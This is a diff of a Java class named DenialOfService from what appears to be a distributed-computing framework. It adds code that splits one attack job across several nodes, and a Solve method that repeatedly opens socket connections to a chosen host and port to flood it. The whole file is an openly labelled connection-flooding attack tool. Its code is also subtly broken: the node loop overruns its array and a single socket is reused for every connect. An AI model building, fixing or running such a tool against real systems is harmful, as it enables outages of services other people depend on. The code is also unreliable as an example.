@@ -1,67 +1,137 @@
 package problemModule;
 
+import java.io.IOException;
+import java.net.InetSocketAddress;
+import java.net.Socket;
+import java.net.UnknownHostException;
+
 public class DenialOfService implements ProblemModule {
 	
 
-	private static final long serialVersionUID = 1L;
-	private int id;
-	private int attempts;
-	private String hostName;
-	private int portNumber;
+	private static final long serialVersionUID = 1L;// unused serialization id variable
+	private Integer id;								// problem module id; 0 = parent, 1 or higher = child
+	private Integer numAttempts;					// number of connection attempts
+	private String hostName;						// target's host name
+	private Integer portNumber;						// target's port number
+	private Socket connectionSpammer;				// socket used to send connection requests
+	private InetSocketAddress target;				// InetSocketAddress constructed from hostName and portNumber
 	
 	/*
-	 * Default constructor
+	 * Parent problem module constructor
+	 * attempts = number of connection attempts
+	 * host = target's host name
+	 * port = target's port number
 	 */
-	public DenialOfService(int numAttempts, String host, int port) {
+	public DenialOfService(Integer attempts, String host, Integer port) {
 		id = 0;
-		attempts = numAttempts;
+		numAttempts = attempts;
 		hostName = host;
 		portNumber = port;
 	}
 	
-	public DenialOfService(int numAttempts, String host, int port, int childID) {
+	/*
+	 * Child problem module constructor
+	 * attempts = number of connection attempts
+	 * host = target's host name
+	 * port = target's port number
+	 * childID = child problem module's id
+	 */
+	public DenialOfService(Integer attempts, String host, Integer port, Integer childID) {
 		id = childID;
-		attempts = numAttempts;
+		numAttempts = attempts;
 		hostName = host;
 		portNumber = port;
 	}
 
+	/*
+	 * Breakdown method for DenialOfService
+	 * Creates problem modules with id numbers from 1 to nodes
+	 * and stores them in an array to return
+	 */
 	@Override
 	public ProblemModule[] breakDown(Integer nodes) {
 		ProblemModule[] distributed = new ProblemModule[nodes];
 		
+		if(nodes > 0) {		// input validation to make sure number of nodes isn't negative
+			if(nodes > 1) {	// more than one node
+				for(int i = 1; i <= nodes; i++) {
+					distributed[i] = new DenialOfService(numAttempts, hostName, portNumber, i);
+				}
+			}
+			else {			// just one node
+				distributed[0] = new DenialOfService(numAttempts, hostName, portNumber, 1);
+			}
+		}
 		
-		return null;
+		return distributed;
 	}
 
+	/*
+	 * Solve method for DenialOfService
+	 * Repeats connection requests to the target to the number
+	 * of attempts specified by numAttempts
+	 */
 	@Override
 	public void Solve() {
-		// TODO Auto-generated method stub
-		
+		try {
+			connectionSpammer = new Socket();	// creates unconnected socket
+			target = new InetSocketAddress(hostName, portNumber);	// target server and port number
+			
+			for(int i = 0; i < numAttempts; i++) {	// repeatedly requests connections to server 
+				connectionSpammer.connect(target);
+			}
+			
+		} catch (UnknownHostException e) {
+			System.out.println(e.getMessage());
+		} catch (IOException e) {
+			System.out.println(e.getMessage());
+		}
 	}
 
+	/*
+	 * Finalize method for DenialOfService
+	 * Does nothing because there is nothing to combine or return
+	 */
 	@Override
 	public void finalize(ProblemModule[] subproblems) {
-		// TODO Auto-generated method stub
 		
 	}
-
-	@Override
-	public Object TestSolver() {
-		// TODO Auto-generated method stub
-		return null;
+	
+	/*
+	 * Get method for id
+	 */
+	public Integer getID() {
+		return id;
+	}
+	
+	/*
+	 * Set method for id
+	 */
+	public void setID(Integer newID) {
+		id = newID;
 	}
 
+	/*
+	 * Unused for DenialOfService
+	 */
+	@Override
+	public Object TestSolver() {
+		return null;
+	}
+	
+	/*
+	 * Unused for DenialOfService
+	 */
 	@Override
 	public boolean TEQ(Object o) {
-		// TODO Auto-generated method stub
 		return false;
 	}
 
+	/*
+	 * Unused for DenialOfService
+	 */
 	@Override
 	public void DelaySolve() throws InterruptedException {
-		// TODO Auto-generated method stub
-		
 	}
 	
 }
